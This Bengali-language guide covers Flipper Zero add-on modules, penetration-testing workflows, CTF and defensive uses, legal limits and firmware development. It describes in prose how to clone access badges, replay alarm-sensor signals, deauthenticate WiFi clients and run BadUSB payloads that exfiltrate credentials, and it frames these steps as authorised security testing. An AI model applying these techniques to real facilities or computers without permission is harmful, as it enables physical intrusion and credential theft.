**WiFi Dev Board** Flipper-এর GPIO হেডারে সরাসরি যুক্ত হয়। এতে **WiFi Marauder** ফার্মওয়্যারসহ ESP32-S2 রয়েছে এবং 802.11 b/g/n-এর সব সুবিধা যোগ হয়:

- **এসএসআইডি স্ক্যান** — কাছের প্রবেশাধিকার বিন্দু তালিকাভুক্ত করে
- **বীকন স্প্যাম** — বহু ভুয়া SSID সম্প্রচার করে সংযুক্ত যন্ত্রগুলোকে বিভ্রান্ত করে
- **সংযোগ-বিচ্ছিন্নকরণ আক্রমণ** — সংযুক্ত যন্ত্রকে প্রবেশ-বিন্দু থেকে বিচ্ছিন্ন করতে 802.11-এর বিচ্ছিন্নকরণ ফ্রেম পাঠায়
- **অনুসন্ধান সংকেত সংগ্রহ** — যন্ত্র এবং সেগুলোর মনে রাখা SSID শনাক্ত করতে অনুসন্ধান-অনুরোধ ধারণ করে
- **WPS আক্রমণ** — WPS-সক্ষম রাউটার খুঁজে ধীরে ধীরে PIN অনুমান করার চেষ্টা করে
- **PMKID সংগ্রহ** — সংযুক্ত যন্ত্র ছাড়াই অফলাইনে পাসওয়ার্ড পরীক্ষা করার জন্য PMKID হ্যাশ ধারণ করে

WiFi Dev Board Flipper-এর পর্দা ও বোতাম দিয়ে নিয়ন্ত্রণ করা হয়। ফোন বা কম্পিউটারের দরকার হয় না।

*নিজের নয় এমন নেটওয়ার্কে সংযোগ-বিচ্ছিন্নকরণ ফ্রেম পাঠানো যুক্তরাষ্ট্রের Computer Fraud and Abuse Act (CFAA) এবং বহু দেশের সমতুল্য আইনে বেআইনি। কেবল অনুমোদিত পরীক্ষাগারে পরীক্ষা করুন।*

### ভিডিও খেলা মডিউল

**ভিডিও গেম মডিউল**-এ RP2040 ও ছোট রিচার্জযোগ্য ব্যাটারি রয়েছে। এটি জিপিআইও হেডারে লাগে এবং বেতার একাধিক-খেলোয়াড়ের খেলা যোগ করে। মূল STM32-এর কাজ কমিয়ে নিজস্ব কোড চালানো স্বতন্ত্র মাইক্রোকন্ট্রোলার হিসেবেও ব্যবহার করা যায়।

### ESP32 WROOM মডিউল (DIY)

ইউএআরটি বা এসপিআই দিয়ে Flipper জিপিআইও-তে যুক্ত সাধারণ **ESP32-WROOM-32** আরও সক্ষমতা যোগ করে:

- নিজস্ব ফার্মওয়্যার-সহ পূর্ণ 802.11 ওয়াইফাই
- Flipper বিএলই-র সঙ্গে একযোগে 2.4 গিগাহার্টজ ব্লুটুথ Classic ও বিএলই
- বাহ্যিক জিপিআইও সম্প্রসারণ
- শারীরিক নিরাপত্তা পরীক্ষার সময় দূর থেকে নিয়ন্ত্রণের ওয়েব-সার্ভার ব্যবস্থা

### Raspberry Pi Zero 2W হেডার অ্যাডাপ্টার

কমিউনিটির তৈরি অ্যাডাপ্টার **Raspberry Pi Zero 2W**-কে Flipper-এর GPIO হেডারের সঙ্গে যুক্ত করে। Pi-তে পূর্ণাঙ্গ Linux চলে এবং এটি UART বা USB সিরিয়ালের মাধ্যমে Flipper-এর সঙ্গে যোগাযোগ করে। এর ব্যবহার:

- দীর্ঘ সময় ধরে তথ্য নথিবদ্ধ করা
- নেটওয়ার্কের খোঁজখবর নিতে Bettercap বা Kismet চালানো
- রেড-টিম অনুশীলনে C2 রিলে হিসেবে কাজ করা
- microSD-তে না ধরার মতো বড় ধারণ সংরক্ষণ

## অনুমোদিত অনুপ্রবেশ পরীক্ষা কর্মপ্রবাহ

### শারীরিক-প্রবেশাধিকার পরীক্ষা কর্মপ্রবাহ

1. লবিতে কাছাকাছি থাকা কর্মীদের প্রবেশ-পরিচয়পত্র পড়তে **125 kHz RFID পাঠক** ব্যবহার করুন।
2. পরিচয়পত্রটি খালি T5577 কার্ডে নকল করুন অথবা Flipper থেকেই এর অনুকরণ করুন।
3. নকল পরিচয়পত্রটি ব্যবহার করে সুরক্ষিত এলাকায় প্রবেশের চেষ্টা করুন।
4. কোন পাঠক নকল করা পরিচয়-তথ্য গ্রহণ করেছে তা নথিবদ্ধ করে গ্রাহককে প্রতিবেদন দিন।



এতে বোঝা যায় স্থাপনাটি EM4100 (অনিরাপদ এবং নকলযোগ্য) নাকি আধুনিক NFC স্মার্ট কার্ডের ওপর নির্ভর করে। এ ধরনের পরীক্ষা কেবল লিখিত অনুমতি ও নির্ধারিত পরিসরের মধ্যে করুন।

### বেতার যন্ত্রের তালিকা

1. অনুমোদিত অবস্থায় **Sub-GHz Frequency Analyzer** (সাব-গিগাহার্টজ কম্পাঙ্ক বিশ্লেষক) চালিয়ে স্থাপনাটি ঘুরুন।
2. সক্রিয় কম্পাঙ্ক ও সংকেতের ধরন লিখে রাখুন।
3. **Read** (সংকেত পড়ুন) দিয়ে বেতার অ্যালার্ম-সংবেদক, পার্কিং-প্রবেশদ্বারের বাধা এবং তাপ, বায়ু চলাচল ও শীতাতপ নিয়ন্ত্রণের নিয়ন্ত্রক যন্ত্রগুলোর সংকেত শনাক্ত করুন।
4. স্থির-কোড যন্ত্রগুলোকে গুরুতর নিরাপত্তা-ঝুঁকি হিসেবে প্রতিবেদনে উল্লেখ করুন।

### আরএফআইডি সমীক্ষা

1. পরিচয়-তথ্য না নিয়েই **NFC > Detect Reader** (কার্ডের মতো কাজ করে পাঠক শনাক্ত করার মেনু) চালিয়ে Flipper-কে কার্ড-এর মতো আচরণ করান এবং পাঠক শনাক্ত করুন।
2. পাঠক Mifare Classic, DESfire বা ISO 15693 সমর্থন করে কি না দেখে প্রতিটি প্রবেশাধিকার বিন্দু-এর নিরাপত্তা মূল্যায়ন করুন।

### BadUSB অনুকরণ

1. Flipper-এর SD কার্ড-এ আগে থেকেই DuckyScript পেলোড রাখুন।
2. Flipper-কে লক খোলা থাকা লক্ষ্য কম্পিউটারে যুক্ত রাখুন (শারীরিক প্রবেশ দরকার)।
3. স্ক্রিপ্টটি স্বয়ংক্রিয়ভাবে চলে: লক্ষ্য কম্পিউটারগুলো শনাক্ত করে, পরিচয়-তথ্য বাইরে পাঠায় এবং ফেরত-যোগাযোগ স্থাপন করে।
4. চালানোর সময় ও শনাক্তকরণের হার নথিবদ্ধ করুন।



এতে প্রতিষ্ঠানের ইউএসবি যন্ত্র-নিয়ন্ত্রণ নীতি ও শেষপ্রান্ত শনাক্তকরণ যাচাই হয়। পরীক্ষা কেবল অনুমোদিত পরীক্ষাগারের কম্পিউটারে করুন এবং পরিচয়-তথ্য সংগ্রহ করবেন না।

### বেতার অ্যালার্ম সেন্সর পরীক্ষা

অনেক বেতার দরজা ও জানালার সংবেদক সাধারণ সাব-গিগাহার্টজ OOK সংকেত পাঠায়। অনুমোদিত পরীক্ষাগারে, কোডটি স্থির হলে:

1. নিয়ন্ত্রিতভাবে সেন্সর সক্রিয় করে সংকেত **ধারণ** করুন।
2. বাস্তব ব্যবস্থায় নয়, পরীক্ষামঞ্চে সংকেত **পুনঃপ্রেরণ** করে সেন্সর সক্রিয় হওয়ার অনুকরণ করুন।
3. অ্যালার্ম ব্যবস্থা সতর্কবার্তা দেয় কি না যাচাই করুন।

এতে বোঝা যায় বেতার সীমানা-সেন্সরের সংকেত পুনঃপ্রেরণ প্রতিরোধ দরকার কি না।

## সিটিএফ ও প্রতিযোগিতায় ব্যবহার

শারীরিক নিরাপত্তা-ভিত্তিক **Capture the Flag (CTF, ঝান্ডা দখলের প্রতিযোগিতা)**-তে Flipper Zero ব্যবহৃত হয়। সাধারণ অনুশীলনগুলো হলো:

- পতাকা-চিহ্নিত বাক্স খুলতে প্রবেশ-পরিচয়পত্র নকল করা
- অনুকৃত দরজা খুলতে সাব-গিগাহার্টজ সংকেত পুনঃপ্রেরণ করা
- লুকানো বার্তা উদ্ধার করতে ইনফ্রারেড সংকেত পাঠোদ্ধার করা
- অন্য ব্যবহারকারীর পরিচয় নিয়ে প্রবেশ যাচাই করতে NFC ট্যাগের অনুকরণ করা
- তত্ত্বাবধানে থাকা কম্পিউটারে পেলোড চালাতে BadUSB ব্যবহার করা

Flipper-এর লগ নথিবদ্ধ করার সুবিধা ও বড় SD কার্ড CTF-তে সংগৃহীত সংকেত পরে বিশ্লেষণের জন্য সংরক্ষণ সহজ করে।

## প্রতিরক্ষামূলক ব্যবহার

নিরাপত্তা দল নিজস্ব পরিবেশ নিরীক্ষা করতে Flipper Zero ব্যবহার করে:

- **কার্ড নিরীক্ষা** — দুর্বল EM4100 বা Mifare Classic ব্যবস্থা শনাক্ত করে DESfire EV2 বা আরও উন্নত কার্ডে উন্নীত করার পরামর্শ
- **বেতার যন্ত্র নিরীক্ষা** — সব সাব-জিগাহার্টজ যন্ত্র নথিবদ্ধ করে স্থির-কোড ব্যবস্থা চিহ্নিত
- **BadUSB নীতি পরীক্ষা** — ইউএসবি এইচআইডি ব্যবহারে নিষেধাজ্ঞা সঠিকভাবে কাজ করছে কি না যাচাই
- **ইনফ্রারেড রিমোট নিরীক্ষা** — সংবেদনশীল সরঞ্জাম সর্বজনীন ইনফ্রারেড রিমোট দিয়ে নিয়ন্ত্রিত হয় কি না যাচাই
- **এনএফসি ট্যাগ নকল করার সক্ষমতা পরীক্ষা** — অনুমোদিত পরীক্ষায় পণ্য বা পরিচয়-তথ্যযুক্ত এনএফসি ট্যাগ নকল করা যায় কি না নির্ধারণ

## আইনি ও নৈতিক বিষয়

Flipper Zero বৈধ নিরাপত্তা-গবেষণার যন্ত্র, তবে এর অপব্যবহারও হতে পারে। আইনি ঝুঁকি বিচারব্যবস্থা ও পরিস্থিতির ওপর নির্ভর করে।

### অনুমতি নিয়ে সাধারণত বৈধ

- নিজের যন্ত্র পরীক্ষা করা
- স্বাক্ষরিত বিবৃতির আওতায় অনুমোদিত অনুপ্রবেশ পরীক্ষা
- নিয়ন্ত্রিত পরীক্ষাগারে নিরাপত্তা গবেষণা
- নিজের প্রবেশাধিকার কার্ড ও রিমোট পড়া
- অনুমোদিত সিটিএফ-এ অংশ নেওয়া

### সাধারণত বেআইনি

- প্রবেশের জন্য অন্যের গ্যারেজের দরজার সংকেত পুনঃপ্রেরণ করা
- অনুমতি ছাড়া ভবনে ঢুকতে প্রবেশাধিকার কার্ড নকল করা
- নিজের নিয়ন্ত্রণে নেই এমন নেটওয়ার্কে সংযোগ-বিচ্ছিন্নকরণ ফ্রেম পাঠানো
- লিখিত অনুমতি ছাড়া কম্পিউটারে BadUSB ব্যবহার
- অধিকাংশ বিচারব্যবস্থায় ব্যক্তিগত যোগাযোগে (সাব-গিগাহার্টজ বা অন্য মাধ্যমে) আড়ি পাতা

**যুক্তরাষ্ট্রে** প্রাসঙ্গিক আইনের মধ্যে Computer Fraud and Abuse Act (CFAA), Electronic Communications Privacy Act (ECPA) এবং রেডিও-কম্পাঙ্ক সম্প্রচার নিয়ে Federal Communications Commission (FCC)-এর নিয়ম রয়েছে। **EU-তে** জাতীয় কম্পিউটার-অপরাধ আইন ও Radio Equipment Directive (রেডিও সরঞ্জাম নির্দেশিকা) একই ধরনের সুরক্ষা দেয়।

*সাব-গিগাহার্টজ সংকেত গ্রহণ করতে পারে এমন যন্ত্র রাখা বা ব্যবহার FCC নিষিদ্ধ করে না। নির্দিষ্ট কম্পাঙ্কে অনুমতি ছাড়া সম্প্রচার নিষিদ্ধ। অধিকাংশ ভোক্তা সাব-গিগাহার্টজ যন্ত্র অনুমতিহীন আইএসএম ব্যান্ড (315 মেগাহার্টজ, 433 মেগাহার্টজ, 915 মেগাহার্টজ) ব্যবহার করে এবং কম শক্তির কারণে সাধারণত Part 15 সীমার মধ্যে থাকে.*

গাড়ি চুরির উদ্বেগে কানাডা 2024 সালে Flipper Zero আমদানি ঠেকানোর চেষ্টা করেছিল। সংবাদমাধ্যমের প্রতিবেদনের পর এটি মূলত রাজনৈতিক প্রতিক্রিয়া ছিল, নির্ভুল প্রযুক্তিগত উদ্বেগ নয়: আধুনিক গাড়ির চাবিবিহীন প্রবেশব্যবস্থা পরিবর্তনশীল কোড ব্যবহার করে, যা অতিরিক্ত হার্ডওয়্যার ছাড়া Flipper ভাঙতে পারে না।

## উন্নয়ন পরিবেশ তৈরি

### সরকারি ফার্মওয়্যার তৈরি

```bash
git clone --recursive https://github.com/flipperdevices/flipperzero-firmware.git
cd flipperzero-firmware

# টুলচেইন ইনস্টল করুন (Linux/macOS)
./fbt

# ফার্মওয়্যার তৈরি করুন
./fbt fap_dist

# USB দিয়ে flash করুন
./fbt flash_usb_full
```

**FBT (Flipper ফার্মওয়্যার নির্মাণের সরঞ্জাম)** নির্মাণ-পরিবেশের ধাপগুলো চালায়, প্রয়োজনীয় সফটওয়্যার সংগ্রহ করে এবং নির্মাণ-প্রক্রিয়া পরিচালনা করে। Python 3.8+ ও ARM GCC ক্রস-কম্পাইলার দরকার।

### নিজস্ব অ্যাপ্লিকেশন লেখা

অ্যাপ **Flipper অ্যাপ্লিকেশন প্যাকেজ (FAP)** বিন্যাস ব্যবহার করে। প্রতিটি অ্যাপ `applications_user/` বা `applications/` ফোল্ডারে থাকে।

```c
#include <furi.h>
#include <gui/gui.h>

static void my_app_draw_callback(Canvas* canvas, void* ctx) {
// ন্যূনতম FAP; ডিফল্ট ফন্টে শুধু ASCII আছে, তাই সম্ভাষণ ইংরেজিতে রাখুন।
    canvas_draw_str(canvas, 10, 32, "Hello, Flipper!");
}

int32_t my_app_main(void* p) {
    UNUSED(p);
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, my_app_draw_callback, NULL);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    furi_delay_ms(3000);

    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    return 0;
}
```

অ্যাপগুলো **Furi (Flipper Universal Registry Implementation)** API দিয়ে Flipper-এর হার্ডওয়্যার ব্যবহার করে। উপব্যবস্থায় প্রবেশাধিকার রেকর্ড-ভিত্তিক: নাম দিয়ে একটি রেকর্ড খুলুন, উপব্যবস্থার পয়েন্টার নিন, সেটি ব্যবহার করুন, তারপর রেকর্ডটি বন্ধ করুন।

### SD কার্ড-এর ফোল্ডার কাঠামো

Flipper SD কার্ডে নির্দিষ্ট ফোল্ডার আশা করে:

| ফোল্ডার | বিষয়বস্তু |
|---|---|
| `subghz/` | সংরক্ষিত সাব-জিগাহার্টজ ধারণ (`.sub`) |
| `nfc/` | সংরক্ষিত এনএফসি ডাম্প (`.nfc`) |
| `lfrfid/` | সংরক্ষিত LF আরএফআইডি চাবি (`.rfid`) |
| `infrared/` | সংরক্ষিত ইনফ্রারেড রিমোট (`.ir`) |
| `ibutton/` | সংরক্ষিত iButton চাবি (`.ibtn`) |
| `badusb/` | DuckyScript পেলোড (`.txt`) |
| `apps/` | তৃতীয়-পক্ষের FAP অ্যাপ্লিকেশন |
| `music_player/` | `.fmf` সঙ্গীত ফাইল |
| `dolphin/` | Dolphin এক্সপি সংরক্ষণ তথ্য |
